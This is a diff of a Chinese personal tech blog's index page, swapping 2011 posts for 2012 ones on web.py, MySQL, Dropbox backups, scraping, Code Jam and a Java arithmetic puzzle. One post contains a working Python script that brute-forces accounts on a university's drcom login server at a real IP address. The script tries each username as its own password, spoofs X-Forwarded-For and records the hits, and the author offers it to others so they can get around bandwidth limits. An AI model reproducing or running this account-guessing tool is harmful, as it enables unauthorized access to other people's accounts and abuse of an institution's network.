@@ -7,7 +7,7 @@
 	<meta name="author" content="dawncold">
 
 	
-	<meta name="description" content="经过昨天一天的努力，软考终于结束了，不知为何昨晚没有写这些，可能是因为晚上给同学过生日玩得很好，也很累，回来没有静下来写这些。 一共复习了2个月，算是挺长的了，很多同学都复习几天就去参加了，不知道他做得怎么样。我感觉这次考试是我做得最难的一套题了，当然有不少成分是紧张， &hellip;">
+	<meta name="description" content="本来做了个一个todo的app感觉python写web app真得好快啊，于是想加入一个user的功能，这样注册的用户就可以写自己的todo了，不过这么一加才感觉到web.py真不好用了，特别是session，还有templates也不怎么好用，官方的文档不知道为何也不给个完整版的， &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -79,18 +79,14 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/11/13/software-exam-is-finished/">
+		<a href="/blog/2012/05/06/webpy-frameworks-is-not-convinent-to-use/">
 		
-			软考结束了</a>
+			web.py真不好用</a>
 	</h2>
 	<div class="entry-content">
-		<p>经过昨天一天的努力，软考终于结束了，不知为何昨晚没有写这些，可能是因为晚上给同学过生日玩得很好，也很累，回来没有静下来写这些。</p>
+		<p>本来做了个一个todo的app感觉python写web app真得好快啊，于是想加入一个user的功能，这样注册的用户就可以写自己的todo了，不过这么一加才感觉到web.py真不好用了，特别是session，还有templates也不怎么好用，官方的文档不知道为何也不给个完整版的，api只是写出来了，但基本都不说是什么作用，想清楚知道运行机制那就得看源代码了，还好不“那么”长！</p>
 
-<p>一共复习了2个月，算是挺长的了，很多同学都复习几天就去参加了，不知道他做得怎么样。我感觉这次考试是我做得最难的一套题了，当然有不少成分是紧张，本来不算太难的题目只要有了紧张就会变得不知从哪里下手。开始做的时候有种在蒙答案的感觉，由于后来做完不能提前上交，我只能又做了一遍，修改了几个题目的答案（虽然知道越改越错的原则），再次做的时候感觉没有那么多题目拿不准，就是只有几个。</p>
-
-<p>下午的考试和上午一样，本来不担心下午考试的，不过一发下试卷来我看看题目，有些害怕——最担心的题目出现了，01背包，我忽略了那个题目直接做了后面的，不过后面那个题目我也有些摸不着头脑——没做过State模式的程序题，但后来又做了一遍后，最后那个题目的意思大致清楚了，按照我的想法写上了答案。回到前面看那个01背包，似乎没有我想得那么难，比较快得做出了答案，还是有些担心的，因为这么重要的一个题怎么会如此简短的答案呢，再仔细看过，没什么大问题，就先这样写上吧。</p>
-
-<p>总的来说时间是很充足的，如果第一遍不大会，那再做一遍或许就会有思路了，希望大家都能考过，明年就能参加高级的试试了！</p>
+<p>哎，暂时就放一下web.py吧！到头来过度依赖框架绝对不是什么好事，嗯，不是什么好兆头现在的我！</p>
 
 		
 		
@@ -110,11 +106,11 @@
   
 
 
-<time datetime="2011-11-13T07:58:00+08:00" pubdate data-updated="true">Nov 13<span>th</span>, 2011</time></div>
+<time datetime="2012-05-06T16:31:00+08:00" pubdate data-updated="true">May 6<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/ji-zhu/'>技术</a>, <a class='category' href='/blog/categories/ruan-kao/'>软考</a>, <a class='category' href='/blog/categories/qing-chun/'>青春</a>
+	<a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/webpy/'>webpy</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -126,12 +122,16 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/11/06/print-exam-id-tomorrow/">
+		<a href="/blog/2012/05/02/mysql-issue/">
 		
-			明天打印准考证</a>
+			网站都挂掉了</a>
 	</h2>
 	<div class="entry-content">
-		<p>前天下午和Yz谈论了一下软考内容，他很不屑于这次考试了，发现了不少问题，而我同样也遇到了类似的问题——出题不规范、答案不清楚等等，让这次考试变得不正式。但我们都已经报名，如果不好好对待就会感觉有些亏了。</p>
+		<p>突然发现mysql无法用localhost连接进去，而用127.0.0.1可以。</p>
+
+<p>linux下是这样的，如果用localhost连接是走的socket路线，用127.0.0.1走的是tcp路线。</p>
+
+<p>修改了php.ini中的mysql.default_socket，值为mysql.sock的文件路径，重启php就好了，不过phpmyadmin的问题依然没有解决，我只是把连接主机换成了127.0.0.1暂时用着。</p>
 
 		
 		
@@ -151,11 +151,11 @@
   
 
 
-<time datetime="2011-11-06T11:07:00+08:00" pubdate data-updated="true">Nov 6<span>th</span>, 2011</time></div>
+<time datetime="2012-05-02T18:17:00+08:00" pubdate data-updated="true">May 2<span>nd</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/ji-zhu/'>技术</a>, <a class='category' href='/blog/categories/ruan-kao/'>软考</a>
+	<a class='category' href='/blog/categories/mysql/'>mysql</a>, <a class='category' href='/blog/categories/socket/'>socket</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -167,12 +167,45 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/10/30/yardvps-add-network-throughout/">
+		<a href="/blog/2012/04/27/backup-mysql-databases-using-python/">
 		
-			传说YardVPS增加了网络带宽</a>
+			用python备份mysql</a>
 	</h2>
 	<div class="entry-content">
-		<p>前几天收到邮件，说是昨晚要升级网络带宽，时间大约30分钟，我也没管这事儿，造成起来看到有服务器宕机的邮件通知，看来昨晚确实网络断掉了。也没感觉速度有什么本质提升呀，我现在就希望在学校中ping值能进200ms就好了，现在是210～20x之间。仍然幻想Linode的东京机房，但那天看到YardVPS已经能保证4个9的上线时间，也就是一年中的下线时间不会超过1小时（大约52分钟）。</p>
+		<p>备份数据库的重要性不想多说了。</p>
+
+<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
+# coding: utf-8
+
+import os
+import sys
+from datetime import *
+import time
+
+#mysql's path
+mysql_path = '/usr/local/mysql/bin/'
+#edit this if your mysql username and password is not like this:
+mysql_username = 'root'
+mysql_password = 'xxxxxx'
+#backup path
+backup_path = 'mysqlbackup/'
+
+def validate_backup_path():
+if os.path.exists(backup_path) == False:
+print "I create a directory here: %s " % backup_path
+os.mkdir(backup_path)
+
+def backup_all_databases():
+filename = "all_%s.sql" % (datetime.utcfromtimestamp(time.time()))
+os.system("%smysqldump -u%s -p%s --all-databases &gt; '%s%s'" % (mysql_path, mysql_username, mysql_password, backup_path, filename))
+
+if __name__ == "__main__":
+validate_backup_path()
+backup_all_databases()
+print "finish!!!"</pre>
+
+
+<p>这个是修改了一次的备份脚本，本来是分数据库备份的，无奈制定了分数据库备份需要输入密码，这就不容易加入cron来自动完成了，不过听说在my.cnf中加入mysqldump的设置可以避免输入账号密码，这也算是一个办法吧，不过还是本着简化的思想，只导出所有数据库出来就好，配合着上一篇的dropbox自动备份，这样VPS的灾备就稍稍好些了：）</p>
 
 		
 		
@@ -192,11 +225,11 @@
   
 
 
-<time datetime="2011-10-30T07:28:00+08:00" pubdate data-updated="true">Oct 30<span>th</span>, 2011</time></div>
+<time datetime="2012-04-27T20:44:00+08:00" pubdate data-updated="true">Apr 27<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/vps/'>vps</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/backup/'>backup</a>, <a class='category' href='/blog/categories/crontab/'>crontab</a>, <a class='category' href='/blog/categories/dropbox/'>dropbox</a>, <a class='category' href='/blog/categories/mysql/'>mysql</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/vps/'>vps</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -208,14 +241,85 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/10/28/software-exam-is-comming-soon/">
+		<a href="/blog/2012/04/27/auto-backup-data-in-vps-using-python-script-to-control/">
 		
-			马上就要软考了</a>
+			dropbox自动备份VPS</a>
 	</h2>
 	<div class="entry-content">
-		<p>我充满了信心，但自己感觉准备周期有些长，每天都用准备软考的理由在上课的时候看软考的资料，导致很多门课现在还是比较陌生的，不过大学中这样并不是大问题，即便是都不怎么学，到了年底要是肯努力几天的话，成绩还是会很给面子的。但我并不喜欢这样突击，我更喜欢轻松自在一点。</p>
+		<p>在<a href="http://www.deepvps.com/dropbox-backup.html" target="_blank">这里</a>看过的文章，感觉很不错，于是发表过来，但发现有点问题，我就自己再改改。</p>
 
-<p>软考结束后本以为能够把丢下的知识拾起来，但国庆和光瑞都找我做些东西，我也想继续搞一些开发，一是能增加些经验，二是能够做一些真正的商业产品，产品和参赛作品毕竟有不少差别，参赛作品做了几个了，就那样放着，产品的话，目前还没有能拿得出手的：（</p>
+<p>安装linux下的dropbox（我的是32为系统，如果是64位在下面地址末尾加上“_64”即可）：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">wget -O dropbox.tar.gz http://www.dropbox.com/download?plat=lnx.x86</pre>
+
+
+<p>解压后在.dropbox-dist目录中有dropboxd可执行文件，让其在后台执行（就是在执行文件后面加“&amp;”符号）</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">~/.dropbox-dist/dropboxd &amp;</pre>
+
+
+<p>此后会出现一个地址，你得复制出来然后在浏览器中打开，之后就是注册或者登陆dropbox，这样就激活了在这台机器上的dropbox，就可以同步文件了。</p>
+
+<p>把需要同步备份的文件软连接到Dropbox这个目录中：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">cd ~/Dropbox
+ln -s /home/wwwroot/
+。。。</pre>
+
+
+<p>此时dropbox已经在帮你同步了，你可以通过web端观察。</p>
+
+<p>我看到的文章中带着一个自动运行的脚本，用sh写的，我发现在主机上运行没反应，不会sh，会点python，于是我改写了一下，也是可用的：</p>
+
+<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin/env python
+# coding: utf-8
+
+import sys
+import os
+
+def start():
+print "Starting Dropbox..."
+os.system("~/.dropbox-dist/dropboxd &amp;")
+
+
+def stop():
+print "Stoping Dropbox..."
+os.system("pkill dropbox")
+
+
+def restart():
+stop()
+start()
+
+
+if __name__ == "__main__":
+action = sys.argv[1]
+print "now action: %s" % action
+if action == 'start':
+start()
+elif action == "stop":
+stop()
+elif action == "restart":
+restart()
+else:
+print "Bad arguments!"</pre>
+
+
+<p>相应的crontab配置文件中这样写就好了：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">#auto dropbox
+0 4 * * * python /root/dropbox.py restart
+0 5 * * * python /root/dropbox.py stop</pre>
+
+
+<p>如果没装crontab（极少情况），这样(也许你用apt-get来做这件事，我的是centos系统，用yum了)：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">yum -y install crontab</pre>
+
+
+<p>python让我很快乐：）</p>
+
+<p>一开始在python用的是exec来执行命令发现不可用，于是用了os.system，查看pydoc才发现exec是执行python code用的……惭愧！</p>
 
 		
 		
@@ -235,11 +339,11 @@
   
 
 
-<time datetime="2011-10-28T22:31:00+08:00" pubdate data-updated="true">Oct 28<span>th</span>, 2011</time></div>
+<time datetime="2012-04-27T17:51:00+08:00" pubdate data-updated="true">Apr 27<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/chan-pin/'>产品</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>, <a class='category' href='/blog/categories/ruan-kao/'>软考</a>
+	<a class='category' href='/blog/categories/dropbox/'>dropbox</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/vps/'>vps</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -251,16 +355,62 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/10/22/i-am-writting-an-os-recently/">
+		<a href="/blog/2012/04/20/grub-table-from-html-using-pything/">
 		
-			最近在写OS</a>
+			抓取一些网页上的表格</a>
 	</h2>
 	<div class="entry-content">
-		<p>其实没有像标题中说的那么宏伟，只是需要写一个软件工程用的文档，就是一系列的需求分析、设计、开发、测试、维护文档，主题自定，我觉着看了很多国内的软件作品，动不动就是XXX系统，好象任何东西加上“系统”两个字之后都会变得无比金光闪闪，那我也来一个吧——“操作系统”。</p>
+		<p>这些表格是所有参加比赛的学生成绩单，当然只有省份、学校、准考证、姓名、组别、奖项、是否进入决赛这几个列，我用python写的脚本来抓取，存入了本地的一个excel中，所以除了python环境之外还需要xlwt这个包包：）</p>
 
-<p>虽然不需要实际编码，但还是需要参考很多资料，不可能一句代码都不出现，主要参考的是《Orange&#8217;s一个操作系统的实现》（《自己动手写操作系统》的第二版），里面最大的难点就是过多的汇编语言，其实C的程序我还是没大有问题的，只要不让我设计什么深奥算法就好：）</p>
+<pre class="prettyprint linenums bush:python" lang="python">#/usr/bin/env python
+#coding: utf-8
 
-<p>学期末交上这个文档，已经分给了几个人去做，但他们可能感觉时间还早吧，到现在也没有动手，我不能等他们，我需要写好设计部分，现在就得深入阅读资料了。</p>
+import urllib2
+import re
+import xlwt
+
+link_list = []
+xls = xlwt.Workbook()
+table = xls.add_sheet("main")
+
+for i in xrange(288, 318):
+link_list.append("http://www.lanqiao.org/Article/ShowArticle.asp?ArticleID=%d"%i)
+
+chinese = []
+content = ''
+while len(link_list) &gt; 0:
+for link in link_list:
+print link
+try:
+content = urllib2.urlopen(url = link, timeout = 3).read()
+link_list = link_list[1:]
+except:
+print "timeout!"
+if link not in link_list[1:]:
+link_list.append(link)
+some = re.findall(u'&lt;TR.*?&lt;\/TR&gt;', content.decode('gbk', 'ignore'), re.S)
+for s in some:
+chinese_value = re.findall(u'(?&lt;=\u5b8b\u4f53&gt;).*(?=&lt;\/FONT&gt;)', s)
+chinese.append(','.join(chinese_value))
+
+for line in xrange(0, len(chinese)):
+tmp = chinese[line].split(',')
+for i in xrange(0, len(tmp)):
+table.write(line, i, tmp[i])
+print "%d, %d, %s" % (line, i, tmp[i])
+
+xls.save('x.xls')
+print len(link_list)</pre>
+
+
+<p>链接抓取超时的时候会自动重新抓取，最终就有了一个叫x.xls的表格。其中有个省的数据有问题，可以在筛选中看到奖项这里面有个垃圾数据项，自己改改吧。</p>
+
+<p>里面的正则表达式耗费了我好久时间！！！不过我还是很欣慰能找到这行：</p>
+
+<pre class="prettyprint linenums bush:python" lang="python">(?&lt;=\u5b8b\u4f53&gt;).*(?=&lt;\/FONT&gt;)</pre>
+
+
+<p>前面两个unicode是“宋体”，这个得看具体的html代码了，所以这个脚本没什么通用性……</p>
 
 		
 		
@@ -280,11 +430,11 @@
   
 
 
-<time datetime="2011-10-22T08:10:00+08:00" pubdate data-updated="true">Oct 22<span>nd</span>, 2011</time></div>
+<time datetime="2012-04-20T09:34:00+08:00" pubdate data-updated="true">Apr 20<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/os/'>OS</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/html/'>html</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/regex/'>regex</a>, <a class='category' href='/blog/categories/table/'>table</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -296,12 +446,16 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/10/06/steve-jobs/">
+		<a href="/blog/2012/04/16/google-code-jam-2012/">
 		
-			希望你依然能够领导我们的创新</a>
+			Code Jam 2012</a>
 	</h2>
 	<div class="entry-content">
-		<p><a title="t_hero.png" href="http://www.youth2009.org/attachment/135250/"><img src="http://www.youth2009.org/usr/uploads/2011/10/332484186.png" alt="t_hero.png"></a></p>
+		<p>资格赛已经结束了，还好做出来几个题，现在来看这些题目都不算是特别有难度，最主要的还是在理解题目的要求，这当然对于我们非英语系国家的人来说是有些困难的，可能我们需要多读几遍题目才能开始编码，这确实有些不利，但最主要的还是理解错了题目，这样才可怕。</p>
+
+<p>第二个题我就理解有些问题，考虑得太多了，看优秀选手的代码，才十几行结束，真是羡慕死我了！！！</p>
+
+<p>下一轮比赛可能就要在家做了吧？毕竟到了我跑回家的日子：）</p>
 
 		
 		
@@ -321,11 +475,11 @@
   
 
 
-<time datetime="2011-10-06T17:19:00+08:00" pubdate data-updated="true">Oct 6<span>th</span>, 2011</time></div>
+<time datetime="2012-04-16T13:20:00+08:00" pubdate data-updated="true">Apr 16<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/zhe-si/'>哲思</a>
+	<a class='category' href='/blog/categories/code-jam/'>Code jam</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -337,24 +491,134 @@
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/10/04/bad-exp-on-centos6/">
+		<a href="/blog/2012/04/08/9-numbers-calculate-110/">
 		
-			Centos6不好</a>
+			9个数运算结果为110</a>
 	</h2>
 	<div class="entry-content">
-		<p>原来的vps是用的centos5.5，一直挺稳定，前段时间为了弄一个小项目停掉了lnmp，装了apache，后来发现lnmp本身带了apache，我绕了圈子。</p>
+		<p>昨天参加了一个小型编程比赛，有个题目是这样的，有1～9这九个数字，按照顺序排列着，你可以在他们之间加入加号、减号或者什么都不加，组成的算式经过运算后结果为110的输出出来。</p>
 
-<p>项目完毕后我重装了centos6，现在想用vpn了，不过发现按照centos5.5的方法安装一些列东西后客户端无法连接—就是一连接上接着被服务器断开。pptpd的日志经常显示：</p>
+<p>看着好简单的题目，当时比赛时候就是一下子没做出来，现在做好了，贴出来，如果有需要可以拿去用哈，代码风格不算好，因为是比赛嘛，又不是商业项目，先快速得到结果再说！</p>
 
-<pre class="prettyprint linenums bush:bash" lang="bash">Oct  4 12:54:28 wodeyitian pptpd[1615]: CTRL: Client 112.227.24.59 control connection started
-Oct  4 12:54:28 wodeyitian pptpd[1615]: CTRL: Starting call (launching pppd, opening GRE)
-Oct  4 12:54:28 wodeyitian pppd[1616]: Plugin /usr/lib/pptpd/pptpd-logwtmp.so loaded.
-Oct  4 12:54:35 wodeyitian pptpd[1615]: GRE: read(fd=7,buffer=80515c0,len=8260) from network failed: status = -1 error = Message too long
-Oct  4 12:54:35 wodeyitian pptpd[1615]: CTRL: GRE read or PTY write failed (gre,pty)=(7,6)
-Oct  4 12:54:35 wodeyitian pptpd[1615]: CTRL: Client 112.227.24.59 control connection finished</pre>
+<pre class="prettyprint linenums bush:java" lang="java">import java.util.ArrayList;
 
 
-<p>不知道有没有人用centos6成功安装了pptpd的帮帮我呢：）</p>
+public class unittest
+{
+   public static void main(String[] argStrings)
+   {
+       long start = System.currentTimeMillis();
+       ArrayList&lt;String&gt; allopts = new ArrayList&lt;String&gt;();
+       int a,b,c,d,e,f,g,h;
+       for(a = 0;a &lt; 3;a++)
+           for(b = 0;b &lt; 3;b++)
+               for(c = 0;c &lt; 3;c++)
+                   for(d = 0;d &lt; 3;d++)
+                       for(e = 0;e &lt; 3;e++)
+                           for(f = 0;f &lt; 3;f++)
+                               for(g = 0;g &lt; 3;g++)
+                                   for(h = 0;h &lt; 3;h++) {
+                                       allopts.add(""+a+b+c+d+e+f+g+h);
+                                   }
+       
+       for (String string : allopts)
+       {
+           String base = "1x2x3x4x5x6x7x8x9";
+           for (int i = 0; i &lt; string.length(); i++)
+           {
+               String tmp = getOpt(Integer.parseInt(""+string.charAt(i)));
+               base = base.replaceFirst("x", tmp);
+           }
+           int x = getResult(base, string.replaceAll("2", "").replaceAll("0", "+").replaceAll("1", "-"));//2-&gt;null
+           if (x == 110)
+           {
+               System.out.println(base);
+           }
+       }
+       System.out.println("All Run Time: " + (System.currentTimeMillis() - start) + "ms");
+   }
+   
+   public static String getOpt(int opt) {
+       String retString = "";
+       switch (opt)
+       {
+           case 0:
+               retString = "+";
+               break;
+           case 1:
+               retString = "-";
+               break;
+           case 2:
+               retString = "";
+               break;
+           default:
+               break;
+       }
+       
+       return retString;
+   }
+   
+   public static int getResult(String calculatString, String optString)
+   {
+       ArrayList&lt;Integer&gt; allNum = new ArrayList&lt;Integer&gt;();
+       ArrayList&lt;String&gt; allOpt = new ArrayList&lt;String&gt;();
+       for (String string : calculatString.split("[+-]"))
+       {
+           allNum.add(Integer.parseInt(string));
+       }
+       for (int i = 0; i &lt; optString.length(); i++)
+       {
+           allOpt.add(optString.charAt(i) + "");
+       }
+       int result = allNum.get(0);
+       for (int i = 1; i &lt; allNum.size(); i++)
+       {
+           char x = (i - 1) == allOpt.size()?'+':allOpt.get(i - 1).charAt(0);
+           int nextNum = i == allNum.size()?0:allNum.get(i);
+           result = getValue(result, nextNum, x);
+       }
+       
+       return result;
+       
+   }
+   
+   public static int getValue(Integer num1, Integer num2, char opt)
+   {
+       int ret = 0;
+       switch (opt)
+       {
+           case '+':
+               ret = num1 + num2;
+               break;
+           case '-':
+               ret = num1 - num2;
+               break;
+           default:
+               break;
+       }
+       
+       return ret;
+   }
+}</pre>
+
+
+<p>结果是这样的：</p>
+
+<pre class="prettyprint linenums bush:bash" lang="bash">1+2+34+5+67-8+9
+1+234-56-78+9
+1-2+3+45-6+78-9
+12+3+45+67-8-9
+12+34+56+7-8+9
+12-3+4-5+6+7+89
+123+4+5+67-89
+123+4-5-6-7-8+9
+123-4+5-6-7+8-9
+123-4-5+6+7-8-9
+All Run Time: 496ms
+</pre>
+
+
+<p>最后我算了算运行时间，应该这就是很慢的了，幸好只有加减和空，要不然会更麻烦的……</p>
 
 		
 		
@@ -374,11 +638,11 @@ Oct  4 12:54:35 wodeyitian pptpd[1615]: CTRL: Client 112.227.24.59 control conne
   
 
 
-<time datetime="2011-10-04T16:59:00+08:00" pubdate data-updated="true">Oct 4<span>th</span>, 2011</time></div>
+<time datetime="2012-04-08T14:20:00+08:00" pubdate data-updated="true">Apr 8<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/centos6/'>centos6</a>, <a class='category' href='/blog/categories/pptpd/'>pptpd</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/acm/'>acm</a>, <a class='category' href='/blog/categories/java/'>java</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -390,12 +654,110 @@ Oct  4 12:54:35 wodeyitian pptpd[1615]: CTRL: Client 112.227.24.59 control conne
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/09/19/show-content-of-blob-in-phpmyadmin/">
+		<a href="/blog/2012/04/04/crack-drcom-account-in-python/">
 		
-			Phpmyadmin显示blob内容</a>
+			Python猜研究生账号</a>
 	</h2>
 	<div class="entry-content">
-		<p>从stackoverflow上看的一个解决方案，修改$cfg[&lsquo;Servers&rsquo;][$i][&lsquo;extension&rsquo;]的值为mysqli，原来是mysql。这样就能看到blob字段的内容了。不过即使是这样，blob内容也许只能是text的才能看到，要是把图片什么的存成了blob还是看不到。</p>
+		<p>嗯，为何要猜研究生账号呢？是这样的，我们学校用的drcom控制网络访问，如果你用本科生账号，那么你最快下载速度也就是100kb/s，如果是老师、研究生账号呢，最快7Mb/s，这是什么差距你应该明白吧？！于是写了一个python的脚本来不断猜测研究生账号，但很可惜的是，猜出来的9个账号经过测试都还是有限速效果，真不知道这些账号是不是研究生账号呢？！！！可恶的学校啊！！！</p>
+
+<pre class="prettyprint linenums bush:python" lang="python">#! /usr/bin python
+# encoding: utf-8
+
+import urllib2
+import urllib
+import sys
+import types
+
+guess_list = []
+server_url = "http://222.174.155.19/"
+headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6',
+'X-Forwarded-For':'1.1.1.1'}
+
+def usage():
+print "USAGE 00: python guess.py FILEPATH of account list file,like: python guess.py ./lists.dat"
+print "USAGE 01: python guess.py START END like: python guess.py 2009123456 2009145396"
+
+def Login(username, password):
+params = urllib.urlencode({'DDDDD': username, 'upass': password, '0MKKey': "%B5%C7%C2%BC%20Login"})
+request = urllib2.Request(url = server_url, data = params, headers = headers)
+try:
+output = urllib2.urlopen(request, timeout = 3).readlines()
+Log(output[5], username, password)
+except:
+print "timeout!"
+global guess_list
+guess_list = guess_list[1:]
+guess_list.append(username)
+
+def Logout():
+output = urllib2.urlopen(server_url + "F.htm")
+
+def Log(output,username, password):
+# "msga='error1'" =&gt; can not login in web
+result = output.find("msga='error1'")
+if result != -1:
+print "find one!!!"
+f = open("./content.dat", 'a')
+f.write(str(username) + '\n')
+f.close()
+else:
+print "pass!"
+f = open("./bad.dat",'a')
+f.write(str(username) + '\n')
+f.close()
+#drop first element
+global guess_list
+guess_list = guess_list[1:]
+
+def show_result():
+print "Result:##########################################"
+print "Have Guessed:"
+for i in open("./content.dat").readlines():
+print i,
+print "some accounts can not guessed are in bad.dat"
+print "Result:##########################################"
+
+def get_timeout_list(timeout_file_path):
+f = open(timeout_file_path)
+global guess_list 
+guess_list = f.readlines()
+f.close()
+
+if len(sys.argv) == 2:
+# itself and only one argv,the path of account list file...
+get_timeout_list(sys.argv[1])
+elif(len(sys.argv) &lt; 2):
+usage()
+else:
+#start and end account,argv[1] and argv[2]
+start = int(sys.argv[1])
+end = int(sys.argv[2])
+if start &gt; end:
+usage()
+exit(-1)
+else:
+guess_list = range(start, end + 1)
+
+if __name__ == "__main__":
+
+while True:
+for i in guess_list:
+#drop last \n or \r
+if type(i) == types.StringType:
+i = i.rstrip('\n\r')
+Logout()
+print "Guess: " + str(i)
+Login(i, i)
+
+if len(guess_list) == 0:
+break
+show_result()</pre>
+
+
+<p>主要就是用了drcom的网页登陆，当然大部分账号都是不能web登陆的啦，不过账号密码正确的话会弹出来一个提示，drcom是使用的js来显示的，于是我监测了是不是有“msga=&lsquo;error1&#8217;”字符串，当然严格来讲还得监测是不是有&#8221;Msg=0&#8221;这个字符串才好，我就省略了……</p>
+
+<p>希望被drcom困扰的人们都能拿去用用，希望对你们有帮助！</p>
 
 		
 		
@@ -415,11 +777,11 @@ Oct  4 12:54:35 wodeyitian pptpd[1615]: CTRL: Client 112.227.24.59 control conne
   
 
 
-<time datetime="2011-09-19T18:22:00+08:00" pubdate data-updated="true">Sep 19<span>th</span>, 2011</time></div>
+<time datetime="2012-04-04T09:01:00+08:00" pubdate data-updated="true">Apr 4<span>th</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/phpmyadmin/'>phpmyadmin</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
+	<a class='category' href='/blog/categories/drcom/'>drcom</a>, <a class='category' href='/blog/categories/python/'>python</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -431,12 +793,18 @@ Oct  4 12:54:35 wodeyitian pptpd[1615]: CTRL: Client 112.227.24.59 control conne
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/09/14/i-am-always-working/">
+		<a href="/blog/2012/03/02/bad-chinese-encoding-in-putty/">
 		
-			一直在努力</a>
+			Putty的中文乱码</a>
 	</h2>
 	<div class="entry-content">
-		<p>最近搞定了数学建模，接下来就是要准备软件设计师的考试，也许不会再有相关技术博客出现了，请大家不要走远呀！我还会回来！</p>
+		<p>着急回家就没带mbp，现在需要修改一下服务器上的文件，于是用了putty这款软件，一定要去官方下载啊，记得前一段时间爆发了在putty中嵌入木马从而盗取了N多服务器的root权限事件。</p>
+
+<p>不过在用的时候发现查看带有中文字符的文件会出现乱码，在<a href="http://koda.iteye.com/blog/219494">这里</a>得到了解决方案：</p>
+
+<p><span style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;">0.打开putty主程序，选择window-〉Appearance-〉Font settings-〉Change&hellip;,选择Fixedsys字体,字符集选择CHINESE_GB2312。 </span><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><span style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;">1.在window-〉Appearance -〉Translation中，Received data assumed to be in which character set 中,把Use font encoding改为UTF-8如果经常使用,把这些设置保存在session里面. </span><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><br style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;"><span style="font-family: Helvetica, Tahoma, Arial, sans-serif; line-height: 25px; text-align: left;">2.现在打开putty,登录成功后,在shell中输入:export LC_ALL=&lsquo;zh_CN.utf8&#8217; </span></p>
+
+<p><p style="text-align: left;"><span style="font-family: Helvetica, Tahoma, Arial, sans-serif;"><span style="line-height: 25px;">然后再打开文件就没问题了。</span></span></p>
 
 		
 		
@@ -456,11 +824,11 @@ Oct  4 12:54:35 wodeyitian pptpd[1615]: CTRL: Client 112.227.24.59 control conne
   
 
 
-<time datetime="2011-09-14T21:06:00+08:00" pubdate data-updated="true">Sep 14<span>th</span>, 2011</time></div>
+<time datetime="2012-03-02T12:08:00+08:00" pubdate data-updated="true">Mar 2<span>nd</span>, 2012</time></div>
 	<div class="tags">
 
 
-	<a class='category' href='/blog/categories/nu-li/'>努力</a>, <a class='category' href='/blog/categories/qing-chun/'>青春</a>
+	<a class='category' href='/blog/categories/putty/'>putty</a>, <a class='category' href='/blog/categories/ji-zhu/'>技术</a>
 
 
 </div>
@@ -472,16 +840,28 @@ Oct  4 12:54:35 wodeyitian pptpd[1615]: CTRL: Client 112.227.24.59 control conne
     <article class="post">
 	<h2 class="title">
 		
-		<a href="/blog/2011/09/12/3days-15hrs/">
+		<a href="/blog/2012/02/23/have-bought-textmate/">
 		
-			三天睡了十几个小时</a>
+			买了textmate</a>
 	</h2>
 	<div class="entry-content">
